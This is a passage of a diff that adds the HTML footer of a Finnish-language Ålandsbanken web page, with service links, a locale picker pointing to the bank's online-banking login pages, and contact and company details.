+                <a href="https://www.alandsbanken.fi/pankkipalvelut" class=" " >Pankkipalvelut</a>
+            </div>
+
+            <div class="cell small-12 medium-shrink c_footer__list__item">
+                <a href="https://www.alandsbanken.fi/premium-banking" class=" " >Premium Banking</a>
+            </div>
+
+            <div class="cell small-12 medium-shrink c_footer__list__item">
+                <a href="http://www.alandsbanken.fi/private-banking/" class=" " >Private Banking</a>
+            </div>
+
+            <div class="cell small-12 medium-shrink c_footer__list__item">
+                    <a href="" class=" " ></a>
+                </div>
+
+                <div class="cell small-12 medium-shrink c_footer__list__item">
+                    <a href="" class=" " ></a>
+                </div>
+            </div>
+    </div>
+    <div class="cell medium-auto u_ie-medium-auto"></div>
+    <div class="cell small-12 medium-shrink">
+        <div class="grid-x c_footer__list">
+            <div class="cell small-12 medium-shrink c_footer__list__item">
+                <a href="https://www.alandsbanken.fi/meista" class=" " >Meista</a>
+            </div>
+
+            <div class="cell small-12 medium-shrink c_footer__list__item">
+                <a href="https://www.alandsbanken.fi/tapaa-meidat" class=" " >Tapaa meidat</a>
+            </div>
+
+            <div class="cell small-12 medium-shrink c_footer__list__item">
+                <a href="https://www.alandsbanken.fi/uutiset" class=" " >Uutiset</a>
+            </div>
+
+            <div class="cell small-12 medium-shrink c_footer__list__item">
+                <a href="https://www.alandsbanken.fi/porssitiedotteet" class=" " >Porssitiedotteet</a>
+            </div>
+
+            <div class="cell small-12 medium-shrink c_footer__list__item">
+                <div class="locale-picker">
+                    <label for="chooseSite" class="show-for-sr">Valitese</label>
+                    <select onchange="window.location = this.value" id="chooseSite">
+                        <option value="https://online.alandsbanken.fi/ebank/auth/initLogin.do?language=1&originBank=1">Alandsbanken Suomi</option>
+                        <option selected value="https://online.alandsbanken.fi/ebank/auth/initLogin.do?language=1&originBank=2">Alandsbanken Ahvenanmaa</option>
+                        <option  value="https://online.alandsbanken.fi/ebank/auth/initLogin.do?language=2&originBank=1">Alandsbanken Finland</option>
+                        <option value="https://secure.alandsbanken.se/ebank/auth/initLogin.do" >Alandsbanken Ruotsi</option>
+                    </select>
+                    <i class="ion-earth"></i>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="grid-x margin-top-1 margin-bottom-1 margin-left-1 margin-right-1">
+    <div class="cell small-12 large-shrink c_footer__content">
+        © Alandsbanken | <a href="https://www.alandsbanken.fi/tietosuoja-kayttoehdot/tietosuojaseloste" target="_blank"> Tietosuojapolitiikka</a> | Y-tunnus: 0145019-3 | BIC: AABAFI22 <br>
+Postiosoite: PB 3, 22101 Mariehamn</div>
+    <div class="cell large-auto u_ie-large-auto"><br/></div>
+    <div class="cell small-12 large-shrink c_footer__content u_color--lightgrey c_footer__content-align">
+        <p>Vaihde: <a href="tel:+358(0)20429011">+358(0)204 29 011</a>* ma-pe 9.00-16.30</p><p>Asiakaspalvelu: <a href="tel:+358(0)204292920">+358(0)204 292 920</a>* ma-pe 08.30-18.00</p>*) Puhelinoperaattorin perima maksu 8,35 snt/puhelu + 16,69 snt/minuutti (alv 24 %). Puhelut tallennetaan.</div>
+</div>
+</footer></div>
+</body>
+</html>
